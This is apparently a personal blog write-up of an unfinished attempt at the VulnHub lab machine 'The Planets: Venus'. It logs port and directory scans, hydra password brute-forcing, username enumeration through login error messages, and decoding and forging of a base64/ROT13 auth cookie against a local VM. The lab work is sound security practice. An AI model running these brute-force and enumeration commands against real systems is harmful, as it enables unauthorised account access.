# The Planets: Venus

[VulnHub](https://www.vulnhub.com/entry/the-planets-venus,705/)
[Series: The Planets](https://www.vulnhub.com/series/the-planets,362/)

[The Planets: Earth writeup](http://blog.f0c1s.com/sec/vulnhub/the-planets-Earth/the-planets-earth.html)

## Description on VulnHub

>
> Difficulty: Medium
> 
> Venus is a medium box requiring more knowledge than the previous box, 
> "Mercury", in this series. 
> There are two flags on the box: 
> a user and root flag which include an md5 hash. 
> This has been tested on VirtualBox so may not work correctly on VMware. 
> Any questions/issues or feedback please email me at: SirFlash at protonmail.com
>

![0.running-box](0.running-box.png)

## Scanning 


```shell
hostname -I: 192.168.42.7 192.168.56.70 
Friday 24 December 2021 11:34:37 AM IST 2021.12.24 11:34:37
f0c1s@kali:~/vuln-hubs/the-planets/Venus $
fping -aAqg 192.168.56.1/24
192.168.56.1
192.168.56.2
192.168.56.70
192.168.56.82
                                                                                                                   
```

```shell
hostname -I: 192.168.42.7 192.168.56.70 
Friday 24 December 2021 11:34:49 AM IST 2021.12.24 11:34:49
f0c1s@kali:~/vuln-hubs/the-planets/Venus $
export RHOST="192.168.56.82"
export LHOST="192.168.56.70"
export LPORT="443"
                                                                                                                   
```

```shell
hostname -I: 192.168.42.7 192.168.56.70 
Friday 24 December 2021 11:34:52 AM IST 2021.12.24 11:34:52
f0c1s@kali:~/vuln-hubs/the-planets/Venus $
_n $RHOST  
firing nmap 192.168.56.82 | tee nmap.default.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-24 11:34 IST
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 0.07 seconds
                                                                                                                   
```

```shell
hostname -I: 192.168.42.7 192.168.56.70 
Friday 24 December 2021 11:34:55 AM IST 2021.12.24 11:34:55
f0c1s@kali:~/vuln-hubs/the-planets/Venus $
_ntd $RHOST
firing nmap 192.168.56.82 -p- -Pn -A -T4 --min-rate=5000 -sVC | tee nmap.tcp-ports.deep.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-24 11:35 IST
Nmap scan report for 192.168.56.82
Host is up (0.00018s latency).
Not shown: 65501 filtered tcp ports (no-response), 32 filtered tcp ports (host-unreach)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.5 (protocol 2.0)
| ssh-hostkey: 
|   256 b0:3e:1c:68:4a:31:32:77:53:e3:10:89:d6:29:78:50 (ECDSA)
|_  256 fd:b4:20:d0:d8:da:02:67:a4:a5:48:f3:46:e2:b9:0f (ED25519)
8080/tcp open  http-proxy WSGIServer/0.2 CPython/3.9.5
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Fri, 24 Dec 2021 06:05:35 GMT
|     Server: WSGIServer/0.2 CPython/3.9.5
|     Content-Type: text/html; charset=utf-8
|     X-Frame-Options: DENY
|     Content-Length: 626
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     <html>
|     <head>
|     <title>Venus Monitoring Login</title>
|     <style>
|     .aligncenter {
|     text-align: center;
|     label {
|     display:block;
|     position:relative;
|     </style>
|     </head>
|     <body>
|     <h1> Venus Monitoring Login </h1>
|     <h2>Please login: </h2>
|     Credentials guest:guest can be used to access the guest account.
|     <form action="/" method="post">
|     <label for="username">Username:</label>
|     <input id="username" type="text" name="username">
|     <label for="password">Password:</label>
|     <input id="username" type="text" name="password">
|     <input type="submit" value="Login">
|     </form>
|     </body>
|_    </html>
|_http-title: Venus Monitoring Login
|_http-server-header: WSGIServer/0.2 CPython/3.9.5
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=12/24%Time=61C5632F%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,363,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Fri,\x2024\x20Dec\x20
SF:2021\x2006:05:35\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPython/3\.9\.
SF:5\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nX-Frame-Options:\x
SF:20DENY\r\nContent-Length:\x20626\r\nX-Content-Type-Options:\x20nosniff\
SF:r\nReferrer-Policy:\x20same-origin\r\n\r\n<html>\n<head>\n<title>Venus\
SF:x20Monitoring\x20Login</title>\n<style>\n\.aligncenter\x20{\n\x20\x20\x
SF:20\x20text-align:\x20center;\n}\nlabel\x20{\n\x20\x20\x20\x20display:bl
SF:ock;\n\x20\x20\x20\x20position:relative;\n}\n</style>\n</head>\n<body>\
SF:n<h1>\x20Venus\x20Monitoring\x20Login\x20</h1>\n<h2>Please\x20login:\x2
SF:0</h2>\nCredentials\x20guest:guest\x20can\x20be\x20used\x20to\x20access
SF:\x20the\x20guest\x20account\.\n<form\x20action=\"/\"\x20method=\"post\"
SF:>\n\x20\x20\x20\x20<br\x20/>\n\x20\x20\x20\x20<label\x20for=\"username\
SF:">Username:</label>\n\x20\x20\x20\x20<input\x20id=\"username\"\x20type=
SF:\"text\"\x20name=\"username\">\n\x20\x20\x20\x20<br\x20/>\n\x20\x20\x20
SF:\x20<label\x20for=\"password\">Password:</label>\n\x20\x20\x20\x20<inpu
SF:t\x20id=\"username\"\x20type=\"text\"\x20name=\"password\">\n\x20\x20\x
SF:20\x20<br\x20/>\n\x20\x20\x20\x20<input\x20type=\"submit\"\x20value=\"L
SF:ogin\">\n</form>\n\n</body>\n</html>\n")%r(HTTPOptions,363,"HTTP/1\.1\x
SF:20200\x20OK\r\nDate:\x20Fri,\x2024\x20Dec\x202021\x2006:05:35\x20GMT\r\
SF:nServer:\x20WSGIServer/0\.2\x20CPython/3\.9\.5\r\nContent-Type:\x20text
SF:/html;\x20charset=utf-8\r\nX-Frame-Options:\x20DENY\r\nContent-Length:\
SF:x20626\r\nX-Content-Type-Options:\x20nosniff\r\nReferrer-Policy:\x20sam
SF:e-origin\r\n\r\n<html>\n<head>\n<title>Venus\x20Monitoring\x20Login</ti
SF:tle>\n<style>\n\.aligncenter\x20{\n\x20\x20\x20\x20text-align:\x20cente
SF:r;\n}\nlabel\x20{\n\x20\x20\x20\x20display:block;\n\x20\x20\x20\x20posi
SF:tion:relative;\n}\n</style>\n</head>\n<body>\n<h1>\x20Venus\x20Monitori
SF:ng\x20Login\x20</h1>\n<h2>Please\x20login:\x20</h2>\nCredentials\x20gue
SF:st:guest\x20can\x20be\x20used\x20to\x20access\x20the\x20guest\x20accoun
SF:t\.\n<form\x20action=\"/\"\x20method=\"post\">\n\x20\x20\x20\x20<br\x20
SF:/>\n\x20\x20\x20\x20<label\x20for=\"username\">Username:</label>\n\x20\
SF:x20\x20\x20<input\x20id=\"username\"\x20type=\"text\"\x20name=\"usernam
SF:e\">\n\x20\x20\x20\x20<br\x20/>\n\x20\x20\x20\x20<label\x20for=\"passwo
SF:rd\">Password:</label>\n\x20\x20\x20\x20<input\x20id=\"username\"\x20ty
SF:pe=\"text\"\x20name=\"password\">\n\x20\x20\x20\x20<br\x20/>\n\x20\x20\
SF:x20\x20<input\x20type=\"submit\"\x20value=\"Login\">\n</form>\n\n</body
SF:>\n</html>\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 119.52 seconds
                                                                                                                   
```


```shell
hostname -I: 192.168.42.7 192.168.56.70 
Friday 24 December 2021 11:47:35 AM IST 2021.12.24 11:47:35
f0c1s@kali:~/vuln-hubs/the-planets/Venus $
sudo nmap $RHOST -n -p- -Pn -T4 --min-rate=5000 --top-ports=100 -sU --open | tee nmap.udp.top-100.txt
[sudo] password for f0c1s: 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-24 11:53 IST
Nmap scan report for 192.168.56.82
Host is up (0.00045s latency).
All 100 scanned ports on 192.168.56.82 are in ignored states.
Not shown: 94 open|filtered udp ports (no-response), 6 filtered udp ports (admin-prohibited)
MAC Address: 08:00:27:0D:80:EE (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.77 seconds
                                                                                                                   
```

There are two ports, 22 for ssh and 8080 for web.

I have met WSGIServer earlier.

The softwares running on the machines are OpenSSH 8.5 (protocol 2.0) and WSGIServer/0.2 CPython/3.9.5

I guess what `which python3` is going to return.

## Attacking web

### Browsing

#### homepage `http://192.168.56.82:8080/`

![1.browsing-homepage](1.browsing-homepage.png)

#### guest:guest

![2.browsing-default-login](2.browsing-default-login.png)

### gobuster

```shell
hostname -I: 192.168.42.7 192.168.56.70 
Friday 24 December 2021 11:37:02 AM IST 2021.12.24 11:37:02
f0c1s@kali:~/vuln-hubs/the-planets/Venus $
gobuster dir --url http://$RHOST:8080 -x py,txt,php,log,bak --wordlist=/usr/share/wordlists/seclists/Discovery/Web-Content/dirsearch.txt -b 404,403 -q 
/admin/               (Status: 302) [Size: 0] [--> /admin/login/?next=/admin/]
/admin/.py            (Status: 302) [Size: 0] [--> /admin/login/?next=/admin/.py]
/admin/.txt           (Status: 302) [Size: 0] [--> /admin/login/?next=/admin/.txt]
/admin/.php           (Status: 302) [Size: 0] [--> /admin/login/?next=/admin/.php]
/admin/.log           (Status: 302) [Size: 0] [--> /admin/login/?next=/admin/.log]
/admin/.bak           (Status: 302) [Size: 0] [--> /admin/login/?next=/admin/.bak]
                                                                                                                   
```

### nikto

```shell
hostname -I: 192.168.42.7 192.168.56.70 
Friday 24 December 2021 11:36:15 AM IST 2021.12.24 11:36:15
f0c1s@kali:~/vuln-hubs/the-planets/Venus $
nikto -C all -host http://$RHOST:8080
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.82
+ Target Hostname:    192.168.56.82
+ Target Port:        8080
+ Start Time:         2021-12-24 11:39:19 (GMT5.5)
---------------------------------------------------------------------------
+ Server: WSGIServer/0.2 CPython/3.9.5
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ Server banner has changed from 'WSGIServer/0.2 CPython/3.9.5' to 'WSGIServer/0.2 Python/3.9.5' which may suggest a WAF, load balancer or proxy is in place
^C                                                                                                                   
```

### dirb

```shell
hostname -I: 192.168.42.7 192.168.56.70 
Friday 24 December 2021 11:46:37 AM IST 2021.12.24 11:46:37
f0c1s@kali:~/vuln-hubs/the-planets/Venus $
dirb http://$RHOST:8080                     

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Dec 24 11:46:46 2021
URL_BASE: http://192.168.56.82:8080/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.82:8080/ ----
+ http://192.168.56.82:8080/admin (CODE:301|SIZE:0)                                                               
                                                                                                                  
-----------------
END_TIME: Fri Dec 24 11:47:35 2021
DOWNLOADED: 4612 - FOUND: 1
                                                                                                                   
```


#### browsing /admin

Going to /admin takes me to `http://192.168.56.82:8080/admin/login/?next=/admin/`

### feroxbuster

```shell
hostname -I: 192.168.42.7 192.168.56.70 
Friday 24 December 2021 11:46:52 AM IST 2021.12.24 11:46:52
f0c1s@kali:~/vuln-hubs/the-planets/Venus $
feroxbuster -q -u http://$RHOST:8080 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --rate-limit 100 -d 2 -L 4 -k     
301        0l        0w        0c http://192.168.56.82:8080/admin
WLD        0l        0w        0c Got 302 for http://192.168.56.82:8080/admin/48dde9a579f44cf5a90758788848d72e (url length: 32)
WLD         -         -         - http://192.168.56.82:8080/admin/48dde9a579f44cf5a90758788848d72e redirects to => /admin/login/?next=/admin/48dde9a579f44cf5a90758788848d72e
Scanning: http://192.168.56.82:8080
Scanning: http://192.168.56.82:8080/admin
^C                                                                                                                   
```

### auth cookie and decoding

![3.auth-cookie](3.auth-cookie.png)

```shell
hostname -I: 192.168.42.7 192.168.56.70 
Friday 24 December 2021 11:52:37 AM IST 2021.12.24 11:52:37
f0c1s@kali:~/vuln-hubs/the-planets/Venus $
echo -n "Z3Vlc3Q6dGhyZmc=" | base64 -d            
guest:thrfg                                                                                                                   
```

This is ROT13. `g` to and back `t` give it away.

It looks like I need to prop up a pyhton server, and read admin's cookie. Did you see a 

### gobuster with cookie

```shell
hostname -I: 192.168.42.7 192.168.56.70 
Friday 24 December 2021 12:12:09 PM IST 2021.12.24 12:12:09
f0c1s@kali:~/vuln-hubs/the-planets/Venus $
gobuster dir --url http://$RHOST:8080 -x txt,php,log,bak,py --wordlist=/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -b 404,403 -q --cookies "auth=Z3Vlc3Q6dGhyZmc="  
/admin                (Status: 301) [Size: 0] [--> /admin/]
                                                                                                                   
```


## hydra

This fails, because I don't even know the user name

```shell
hostname -I: 192.168.42.7 192.168.56.70 
Friday 24 December 2021 11:57:38 AM IST 2021.12.24 11:57:38
f0c1s@kali:~/vuln-hubs/the-planets/Venus $
hydra -l admin -P /usr/share/wordlists/rockyou.txt $RHOST -s 8080 http-post-form '/admin/login/?next=/admin/:id_username=^USER^&id_password=^PASS^&submit=Log+in:F=Server Error (500)'
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-24 11:57:39
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://192.168.56.82:8080/admin/login/?next=/admin/:id_username=^USER^&id_password=^PASS^&submit=Log+in:F=Server Error (500)
[STATUS] 3882.00 tries/min, 3882 tries in 00:01h, 14340517 to do in 61:35h, 16 active
[STATUS] 3964.67 tries/min, 11894 tries in 00:03h, 14332505 to do in 60:16h, 16 active
[STATUS] 3942.43 tries/min, 27597 tries in 00:07h, 14316802 to do in 60:32h, 16 active
[STATUS] 3895.40 tries/min, 58431 tries in 00:15h, 14285968 to do in 61:08h, 16 active
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
                                                                                                                   
```

### look for usernames on homepage

The interesting thing is that if you enter wrong username, it says "Invalid username.".

![4.invalid-username](4.invalid-username.png)

If you enter "guest" in username only and hit enter, then it says "Invalid password.".

![5.invalid-password](5.invalid-password.png)

We can abuse this feature or bug.

```shell
hostname -I: 192.168.42.7 192.168.56.70 
Friday 24 December 2021 12:30:01 PM IST 2021.12.24 12:30:01
f0c1s@kali:~/vuln-hubs/the-planets/Venus $
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p '' $RHOST -s 8080 http-post-form '/:username=^USER^&password=^PASS^&submit=Login:F=Invalid username.' -t 64 -I 
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-24 12:30:09
[DATA] max 64 tasks per 1 server, overall 64 tasks, 8295455 login tries (l:8295455/p:1), ~129617 tries per task
[DATA] attacking http-post-form://192.168.56.82:8080/:username=^USER^&password=^PASS^&submit=Login:F=Invalid username.
[8080][http-post-form] host: 192.168.56.82   login: guest
[8080][http-post-form] host: 192.168.56.82   login: magellan
[STATUS] 13098.00 tries/min, 13098 tries in 00:01h, 8282357 to do in 10:33h, 64 active
[STATUS] 12719.00 tries/min, 38157 tries in 00:03h, 8257298 to do in 10:50h, 64 active
[8080][http-post-form] host: 192.168.56.82   login: venus
[STATUS] 12926.71 tries/min, 90487 tries in 00:07h, 8204968 to do in 10:35h, 64 active
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
                                                                                                                   
```

We have three users: 
- guest:guest
- magellan
- venus

`hydra` was going to take a long time, 10+hours, if these don't work, I'll put hydra to crack usernames overnight.

And we know from the guest:guest auth cookie above that the auth value was rot13. I wonder if I can do that right now.

Rot13 values are:
- thrfg
- zntryyna
- irahf

## Login as venus:venus

```shell
hostname -I: 192.168.42.7 192.168.56.70 
Friday 24 December 2021 12:23:07 PM IST 2021.12.24 12:23:07
f0c1s@kali:~/vuln-hubs/the-planets/Venus $
echo -n "dmVudXM6aXJhaGY=" | base64 -d
venus:irahf                                                                                                                   
```

```shell
hostname -I: 192.168.42.7 192.168.56.70 
Friday 24 December 2021 12:44:42 PM IST 2021.12.24 12:44:42
f0c1s@kali:~/vuln-hubs/the-planets/Venus $
echo -n "magellan:zntryyna" | base64  
bWFnZWxsYW46em50cnl5bmE=
                                                                                                                   
```

Unfortunately, magellan:magellan is not valid as credentials.

hydra doesn't return anything useful. Some other day?
